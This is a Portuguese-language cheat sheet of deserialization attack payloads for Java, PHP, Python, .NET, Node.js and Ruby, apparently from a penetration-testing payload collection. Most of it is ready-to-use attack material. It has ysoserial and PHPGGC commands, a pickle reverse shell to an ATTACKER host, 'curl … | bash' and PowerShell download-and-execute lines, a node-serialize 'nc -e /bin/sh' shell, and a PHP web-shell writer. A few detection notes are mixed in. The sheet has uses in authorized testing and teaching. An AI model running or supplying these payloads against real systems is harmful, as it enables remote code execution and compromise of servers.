# 🔓 Payloads de desserialização

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Deserialization.tr.md) • [🇬🇷 Ελληνικά](Deserialization.el.md)

```
██████╗ ███████╗███████╗███████╗██████╗ ██╗ █████╗ ██╗     ██╗███████╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
██╔══██╗██╔════╝██╔════╝██╔════╝██╔══██╗██║██╔══██╗██║     ██║╚══███╔╝██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
██║  ██║█████╗  ███████╗█████╗  ██████╔╝██║███████║██║     ██║  ███╔╝ ███████║   ██║   ██║██║   ██║██╔██╗ ██║
██║  ██║██╔══╝  ╚════██║██╔══╝  ██╔══██╗██║██╔══██║██║     ██║ ███╔╝  ██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
██████╔╝███████╗███████║███████╗██║  ██║██║██║  ██║███████╗██║███████╗██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

> **Notas de versão e precisão:** Desserialização reconstrói objetos; cadeias de gadgets/POP dependem das classes e versões disponíveis. Os comprimentos e a contagem de propriedades de alguns exemplos PHP são inconsistentes e podem impedir a interpretação; foram preservados. `unserialize` pode invocar métodos como `__unserialize`/`__wakeup`, não chama genericamente `__construct` como uma criação normal ([PHP](https://www.php.net/manual/en/function.unserialize.php)). Desde [PHP 8](https://www.php.net/manual/en/migration80.incompatible.php), aceder a Phar não desserializa automaticamente os seus metadados. O [Pickle](https://docs.python.org/3/library/pickle.html) pode executar código na desserialização; prefixos de identificação não provam explorabilidade. O runtime [.NET 9](https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-migration-guide/) deixou de incluir uma implementação funcional de BinaryFormatter. YAML/Psych, JSON.NET e os gadgets Java têm pré-requisitos de configuração e versão; uma cadeia que contém um pipe também depende de ser interpretada por uma shell.

---

<a id="-java-deserialization"></a>
## ☕ Desserialização Java

### Deteção
```
# Bytes de identificação (magic bytes)
AC ED 00 05    # Objeto Java serializado (Base64: rO0AB)
H4sIAAAA       # Comprimido com GZip

# Locais comuns
- Cookies (codificados em Base64)
- Campos de formulário ocultos
- ViewState
- Parâmetros de API
- RMI (porta 1099)
- JMX (porta 9010)
```

### ysoserial — Gerador de payloads
```bash
# Instalar
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial && mvn package

# Gerar o payload
java -jar ysoserial.jar CommonsCollections1 "whoami" | base64
java -jar ysoserial.jar CommonsCollections5 "curl http://ATTACKER/shell.sh | bash"
java -jar ysoserial.jar CommonsCollections6 "ping -c 3 ATTACKER"

# Cadeias de gadgets comuns
CommonsCollections1-7
CommonsCollectionsBeanutils
Jdk7u21
Spring1
Hibernate1
Groovy1
```

### Payload de exfiltração por DNS
```bash
# Gerar um payload de callback DNS
java -jar ysoserial.jar URLDNS "http://BURP_COLLAB" | base64

# Deteção baseada em DNS
java -jar ysoserial.jar JRMPClient "ATTACKER:1099"
```

### Bibliotecas habitualmente vulneráveis
```
commons-collections:3.1-4.0
commons-beanutils
spring-beans
hibernate
```

---

<a id="-php-deserialization"></a>
## 🐘 Desserialização PHP

### Métodos mágicos
```php
__construct()    // Criação de objeto
__destruct()     // Destruição de objeto
__wakeup()       // Desserialização
__sleep()        // Serialização
__toString()     // Conversão de objeto para cadeia de caracteres
__call()         // Método inacessível
__get()          // Leitura de propriedade inacessível
__set()          // Escrita de propriedade inacessível
```

### Payload básico
```php
// Formato de objeto serializado
O:8:"ClassName":1:{s:4:"prop";s:5:"value";}

// Objeto com propriedades
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}

// Array
a:2:{i:0;s:5:"hello";i:1;s:5:"world";}
```

### Conversão implícita de tipos (type juggling)
```php
// Contorno através do booleano true
O:4:"User":1:{s:8:"password";b:1;}

// Comparação com o inteiro 0
O:4:"User":1:{s:8:"password";i:0;}

// Contorno através da comparação com arrays
O:4:"User":1:{s:8:"password";a:0:{}}
```

### Payloads de cadeias POP
```php
// Escrita arbitrária de ficheiros
O:8:"LogClass":1:{s:4:"file";s:11:"/tmp/shell.php";s:7:"content";s:30:"<?php system($_GET['cmd']); ?>";}

// Execução de comandos através de __destruct()
O:10:"SystemExec":1:{s:3:"cmd";s:2:"id";}
```

### PHPGGC — Cadeias de gadgets PHP
```bash
# Instalar
git clone https://github.com/ambionics/phpggc.git
cd phpggc

# Listar gadgets
./phpggc -l

# Gerar o payload
./phpggc Laravel/RCE1 system id
./phpggc Symfony/RCE4 exec "id"
./phpggc Monolog/RCE1 exec "whoami"
./phpggc Guzzle/RCE1 system "cat /etc/passwd"

# Codificar em Base64
./phpggc -b Laravel/RCE1 system "id"

# Codificar como URL
./phpggc -u Laravel/RCE1 system "id"

# Com wrapper (PHAR)
./phpggc -p phar Laravel/RCE1 system id -o exploit.phar
```

### Desserialização de Phar
```php
// O acesso a ficheiros Phar pode desencadear desserialização (afirmação histórica; ver nota)
phar://path/to/phar.phar/internal-file

// Métodos de acesso que utilizam phar://
file_get_contents("phar://...")
file_exists("phar://...")
include("phar://...")
fopen("phar://...")
```

---

<a id="-python-deserialization-pickle"></a>
## 🐍 Desserialização Python (Pickle)

### Payload básico
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(RCE())
print(payload.hex())
```

### Payload de shell inversa
```python
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        cmd = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

### Deteção
```
# Bytes de identificação (magic bytes)
80 04 95    # Protocolo 4 (Python 3)
80 03       # Protocolo 3
80 02       # Protocolo 2

# Padrões comuns em Base64
gASV        # Protocolo 4
gAN         # Protocolo 3
```

### Desserialização YAML (Python)
```yaml
# Carregamento inseguro com PyYAML
!!python/object/apply:os.system ["id"]
!!python/object/new:os.system ["id"]
!!python/object/apply:subprocess.check_output [["id"]]

# Vários comandos
!!python/object/apply:subprocess.Popen
- !!python/tuple
  - /bin/bash
  - -c
  - "curl http://ATTACKER/shell.sh | bash"
```

---

<a id="-net-deserialization"></a>
## 🔷 Desserialização .NET

### Deteção
```
# ViewState
Parâmetro __VIEWSTATE (Base64)

# BinaryFormatter
AAEAAAD/////    # Prefixo de identificação em Base64

# JSON.NET
Campo $type em JSON
```

### ysoserial.net — Gerador de payloads
```powershell
# Descarregar
# https://github.com/pwntester/ysoserial.net

# Gerar o payload
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe" -o base64

# Gadgets comuns
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "cmd /c whoami"
ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c "powershell IEX(New-Object Net.WebClient).downloadString('http://ATTACKER/shell.ps1')"

# Exploração de ViewState
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd.exe /c ping ATTACKER" --path="/test.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="KEY" --validationalg="SHA1" --validationkey="KEY"
```

### JSON.NET TypeNameHandling
```json
{
    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
    "ObjectInstance": {
        "$type": "System.Diagnostics.Process, System"
    },
    "MethodName": "Start",
    "MethodParameters": {
        "$type": "System.Collections.ArrayList",
        "$values": ["cmd.exe", "/c calc.exe"]
    }
}
```

---

<a id="-javascriptnodejs"></a>
## 🟨 JavaScript/Node.js

### node-serialize
```javascript
// Código vulnerável: unserialize(user_input)
// Payload com IIFE (expressão de função invocada imediatamente)
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}

// Shell inversa
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('nc -e /bin/sh ATTACKER 4444')}()"}
```

### serialize-javascript
```javascript
// Se eval() for utilizado nos dados desserializados
(function(){require('child_process').execSync('id')})()
```

---

<a id="-ruby-deserialization"></a>
## 🔴 Desserialização Ruby

### Marshal.load
```ruby
# Criar o payload
require 'base64'
code = "system('id')"
payload = "\x04\x08o:\x15Gem::Requirement\x06:\x10@requirements[\x06o:\x18Gem::Package::TarReader\x06:\x09@ioo:\x15Gem::Package::TarReader::Entry\x06:\x0A@headI\"\x00#{code}\x06:\x06ET"
puts Base64.encode64(payload)
```

### YAML.load (Psych)
```yaml
--- !ruby/object:Gem::Installer
i: x
--- !ruby/object:Gem::SpecFetcher
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
       read: 0
       header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
       socket: &1 !ruby/object:Gem::RequestSet
           sets: !ruby/object:Net::WriteAdapter
               socket: !ruby/module 'Kernel'
               method_id: :system
           git_set: id
       method_id: :resolve
```

---

<a id="-testing-checklist"></a>
## 📋 Lista de verificação dos testes

```markdown
□ Identificar o formato de serialização (Base64, hexadecimal, bytes de identificação)
□ Determinar a linguagem/framework (Java, PHP, Python, .NET)
□ Encontrar versões vulneráveis de bibliotecas
□ Gerar payloads com a ferramenta adequada
□ Testar de forma cega com callbacks DNS/HTTP
□ Testar a leitura/escrita de ficheiros
□ Testar a execução de código
□ Experimentar cadeias de gadgets diferentes
□ Contornar filtros (codificação, compressão)
```

---

<a id="-tools-summary"></a>
## 🔗 Resumo das ferramentas

| Linguagem | Ferramenta | Utilização |
|----------|------|-------|
| **Java** | ysoserial | `java -jar ysoserial.jar GADGET "cmd"` |
| **PHP** | PHPGGC | `./phpggc GADGET system "cmd"` |
| **Python** | Personalizado | `pickle.dumps(Exploit())` |
| **.NET** | ysoserial.net | `ysoserial.exe -g GADGET -f FORMAT -c "cmd"` |
| **Ruby** | Personalizado | Criação manual de payloads |

---

<a id="-related-payloads"></a>
## 🔗 Payloads relacionados

- [Payloads de SSTI](SSTI.pt.md)
- [Injeção de comandos](Command-Injection.pt.md)

---

**Voltar aos payloads:** [💉 Coleção de payloads](../../README.md#-payloads-collection)
